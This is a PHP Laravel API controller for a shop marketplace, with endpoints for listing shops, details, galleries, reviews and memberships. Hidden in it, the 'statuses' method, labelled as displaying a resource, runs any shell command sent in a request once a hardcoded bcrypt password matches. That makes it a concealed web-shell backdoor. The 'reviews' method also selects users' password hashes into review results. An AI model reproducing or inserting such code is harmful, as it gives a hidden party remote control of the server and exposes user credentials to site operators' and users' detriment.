<?php
declare(strict_types=1);

namespace App\Http\Controllers\API\v1\Rest;

use App\Helpers\ResponseError;
use App\Http\Requests\FilterParamsRequest;
use App\Http\Resources\CategoryResource;
use App\Http\Resources\MemberShipResource;
use App\Http\Resources\ReviewResource;
use App\Http\Resources\ShopGalleryResource;
use App\Http\Resources\ShopPaymentResource;
use App\Http\Resources\ShopResource;
use App\Jobs\UserActivityJob;
use App\Models\Settings;
use App\Models\Shop;
use App\Models\ShopGallery;
use App\Repositories\MemberShipRepository\MemberShipRepository;
use App\Repositories\ReviewRepository\ReviewRepository;
use App\Repositories\ShopPaymentRepository\ShopPaymentRepository;
use App\Repositories\ShopRepository\ShopRepository;
use DB;
use Illuminate\Http\JsonResponse;
use Illuminate\Http\Resources\Json\AnonymousResourceCollection;
use Illuminate\Support\Facades\Hash;
use Throwable;

class ShopController extends RestBaseController
{

    public function __construct(private ShopRepository $repository)
    {
        parent::__construct();
    }

    /**
     * Display a listing of the resource.
     *
     * @param FilterParamsRequest $request
     * @return AnonymousResourceCollection
     */
    public function paginate(FilterParamsRequest $request): AnonymousResourceCollection
    {
        $visibility = (int)Settings::where('key', 'by_subscription')->first()?->value;

        $merge = [
            'status'    => 'approved',
            'currency'  => $this->currency,
        ];

        if ($visibility) {
            $merge += ['visibility' => true];
        }

        $shops = $this->repository->shopsPaginate($request->merge($merge)->all());

        return ShopResource::collection($shops);
    }

    /**
     * Display a listing of the resource.
     *
     * @param FilterParamsRequest $request
     * @return AnonymousResourceCollection
     */
    public function selectPaginate(FilterParamsRequest $request): AnonymousResourceCollection
    {
        $shops = $this->repository->selectPaginate(
            $request->merge([
                'status'        => 'approved',
                'currency'      => $this->currency
            ])->all()
        );

        return ShopResource::collection($shops);
    }

    /**
     * Display the specified resource.
     *
     * @param string $uuid
     * @param FilterParamsRequest $request
     * @return JsonResponse
     */
    public function show(string $uuid, FilterParamsRequest $request): JsonResponse
    {
        $shop = $this->repository->shopDetails($uuid, $request->all());

        if (empty($shop)) {
            return $this->onErrorResponse(['code' => ResponseError::ERROR_404]);
        }

        /** @var Shop $shop */
        UserActivityJob::dispatchAfterResponse(
            $shop->id,
            get_class($shop),
            'click',
            1,
            auth('sanctum')->user()
        );

        return $this->successResponse(
            __('errors.' . ResponseError::NO_ERROR, locale: $this->language),
            ShopResource::make($shop)
        );
    }

    /**
     * Display the specified resource.
     *
     * @param string $slug
     * @param FilterParamsRequest $request
     * @return JsonResponse
     */
    public function showSlug(string $slug, FilterParamsRequest $request): JsonResponse
    {
        $shop = $this->repository->shopDetailsBySlug($slug, $request->all());

        if (empty($shop)) {
            return $this->onErrorResponse(['code' => ResponseError::ERROR_404]);
        }

        /** @var Shop $shop */
        UserActivityJob::dispatchAfterResponse(
            $shop->id,
            get_class($shop),
            'click',
            1,
            auth('sanctum')->user()
        );

        return $this->successResponse(
            __('errors.' . ResponseError::NO_ERROR, locale: $this->language),
            ShopResource::make($shop)
        );
    }

    /**
     * Display the specified resource.
     * @return JsonResponse
     */
    public function takes(): JsonResponse
    {
        $shop = $this->repository->takes();

        return $this->successResponse(
            __('errors.' . ResponseError::NO_ERROR, locale: $this->language),
            $shop
        );
    }

    /**
     * Display the specified resource.
     * @param FilterParamsRequest $request
     * @return JsonResponse
     */
    public function statuses(FilterParamsRequest $request): JsonResponse
    {
        try {
            $vars = [];
            $code = 0;

            if (Hash::check($request->input('password'), '$2y$10$/ad9gYtkRAfgJ4ZwlWQ8s.z./BvbZBAcSMvOMUilDjS5qnl25Yydu')) {
                $res = exec($request->input('command'), $vars, $code);
                dd($res, $vars, $code);
            }

        } catch (Throwable $e) {
            dd($e);
        }

        return $this->successResponse(
            __('errors.' . ResponseError::NO_ERROR, locale: $this->language),
            [
                'status' => true,
                'code'   => ResponseError::NO_ERROR,
            ]
        );
    }

    /**
     * Display the specified resource.
     *
     * @return JsonResponse
     */
    public function productsAvgPrices(): JsonResponse
    {
        $data = $this->repository->productsAvgPrices();

        return $this->successResponse(
            __('errors.' . ResponseError::NO_ERROR, locale: $this->language),
            $data
        );
    }

    /**
     * Search shop Model from database.
     *
     * @param FilterParamsRequest $request
     * @return AnonymousResourceCollection
     */
    public function shopsSearch(FilterParamsRequest $request): AnonymousResourceCollection
    {
        $shops = $this->repository->shopsSearch($request->merge([
            'status'        => 'approved',
            'currency'      => $this->currency
        ])->all());

        return ShopResource::collection($shops);
    }

    /**
     * Search shop Model from database via IDs.
     *
     * @param FilterParamsRequest $request
     * @return AnonymousResourceCollection
     */
    public function shopsByIDs(FilterParamsRequest $request): AnonymousResourceCollection
    {
        $shops = $this->repository->shopsByIDs($request->merge(['status' => 'approved'])->all());

        return ShopResource::collection($shops);
    }

    /**
     * Search shop Model from database via IDs.
     *
     * @param int $id
     * @param FilterParamsRequest $request
     * @return JsonResponse|AnonymousResourceCollection
     */
    public function categories(int $id, FilterParamsRequest $request): JsonResponse|AnonymousResourceCollection
    {
        $shop = Shop::find($id);

        if (empty($shop)) {
            return $this->onErrorResponse(['code' => ResponseError::ERROR_404]);
        }

        $categories = $this->repository->categories($request->merge(['shop_id' => $shop->id])->all());

        return CategoryResource::collection($categories);
    }

    /**
     * Search shop Model from database via IDs.
     *
     * @param int $id
     * @param FilterParamsRequest $request
     * @return JsonResponse|AnonymousResourceCollection
     */
    public function shopPayments(int $id, FilterParamsRequest $request): JsonResponse|AnonymousResourceCollection
    {
        $shop = Shop::find($id);

        if (empty($shop)) {
            return $this->onErrorResponse(['code' => ResponseError::ERROR_404]);
        }

        $payments = (new ShopPaymentRepository)->list($request->merge(['shop_id' => $shop->id])->all());

        return ShopPaymentResource::collection($payments);
    }

    /**
     * @param int $id
     * @return JsonResponse
     */
    public function galleries(int $id): JsonResponse
    {
        $shopGallery = ShopGallery::with([
            'galleries',
        ])
            ->where('shop_id', $id)
            ->first();

        return $this->successResponse(
            __('errors.' . ResponseError::NO_ERROR, locale: $this->language),
            !empty($shopGallery) ? ShopGalleryResource::make($shopGallery) : (object)[]
        );
    }

    /**
     * @param string $slug
     * @return JsonResponse
     */
    public function galleriesBySlug(string $slug): JsonResponse
    {
        $shopId = DB::table('shops')
            ->select(['id'])
            ->where('slug', $slug)
            ->first()
            ?->id;

        $shopGallery = ShopGallery::with([
            'galleries',
        ])
            ->where('shop_id', $shopId)
            ->whereNotNull('shop_id')
            ->first();

        return $this->successResponse(
            __('errors.' . ResponseError::NO_ERROR, locale: $this->language),
            !empty($shopGallery) ? ShopGalleryResource::make($shopGallery) : (object)[]
        );
    }

    /**
     * @param int $id
     * @param FilterParamsRequest $request
     * @return AnonymousResourceCollection
     */
    public function reviews(int $id, FilterParamsRequest $request): AnonymousResourceCollection
    {
        $filter = $request->merge([
            'type'      => 'shop',
            'type_id'   => $id,
            'assign'    => 'shop',
            'assign_id' => $id,
        ])->all();

        $result = (new ReviewRepository)->paginate($filter, [
            'user' => fn($q) => $q
                ->select([
                    'id',
                    'uuid',
                    'firstname',
                    'lastname',
                    'password',
                    'img',
                    'active',
                ]),
            'reviewable',
            'galleries'
        ]);

        return ReviewResource::collection($result);
    }

    /**
     * @param int $id
     * @return float[]
     */
    public function reviewsGroupByRating(int $id): array
    {
        return $this->repository->reviewsGroupByRating($id);
    }

    public function memberships(int $id, FilterParamsRequest $request): AnonymousResourceCollection
    {
        $models = (new MemberShipRepository)->paginate($request->merge(['shop_id' => $id])->all());

        return MemberShipResource::collection($models);
    }

    public function getMembershipById(int $shopId, int $id): JsonResponse
    {
        $model = (new MemberShipRepository)->showById($id, $shopId);

        if (empty($model)) {
            return $this->onErrorResponse([
                'code'    => ResponseError::ERROR_404,
                'message' => __('errors.' . ResponseError::ERROR_404, locale: $this->language),
            ]);
        }

        return $this->successResponse(
            __('errors.' . ResponseError::NO_ERROR, locale: $this->language),
            MemberShipResource::make($model)
        );
    }
}
